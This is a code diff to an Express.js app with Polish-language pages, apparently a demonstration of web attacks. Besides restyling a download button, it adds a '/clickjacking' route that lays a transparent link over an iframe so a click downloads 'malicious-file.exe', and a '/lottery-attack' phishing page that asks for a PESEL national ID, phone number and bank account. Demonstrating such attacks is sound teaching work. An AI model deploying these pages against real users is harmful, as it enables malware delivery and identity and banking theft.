@@ -72,9 +72,9 @@ app.get("/download-file", (req, res) => {
     .download-wrapper {
       display: inline-flex;
       align-items: center;
-      justify-content: flex-end;
+      justify-content: flex-start;
       font-family: "Mitr-Medium";
-      width: 500px;
+      width: 100%;
       color: white;
     }
 
@@ -86,13 +86,62 @@ app.get("/download-file", (req, res) => {
       border: none;
       width: 200px;
       font-family: "Mitr-Medium";
-      margin-left: 15px;
+      margin-right: 15px;
     }
     </style>
     <div class="download-wrapper">
-      <p>Kliknij w przycisk, aby pobrać film: </p>
-      
       <button class="button">Pobierz film</button>
+      <p>Kliknij w przycisk, aby pobrać film</p>
+    </div>
+    `);
+});
+
+app.get("/clickjacking", (req, res) => {
+  res.send(`
+    <style>
+    iframe {
+      position: relative;
+    }
+    a {
+      position: absolute;
+      width: 100vw;
+      height: 100vh;
+      background: transparent;
+      z-index: 1
+    }
+    </style>
+
+    <a href="/malicious-file.exe" download="malicious-file.exe" id="a" ></a>
+    <iframe style="width: 100%; height:100%" src="https:localhost:5001" />
+    
+    <script>
+      const iframe = document.getElementByTagName('iframe');
+      iframe.addEventListener('click', () => {
+        document.getElementById('a').click();
+      })
+    </script>
+    `);
+});
+
+app.get("/lottery-attack", (req, res) => {
+  res.send(`
+    <h1>Gratulacje!</h1>
+    <h2>Wygrałeś 100.000 zł!!!</h2>
+    Podaj swoje dane, abyśmy mogli przelać Ci wygrane pieniądze:
+    <div>
+    <p>Imię:</p>
+    <input/>
+    <p>Nazwisko:</p>
+    <input/>
+    <p>PESEL:</p>
+    <input/>
+    <p>Numer telefonu:</p>
+    <input/>
+    <p>Numer konta bankowego</p>
+    <input/>
+    <div>
+    <button style="margin-top: 20px">Wyślij</button>
+    </div>
     </div>
     `);
 });
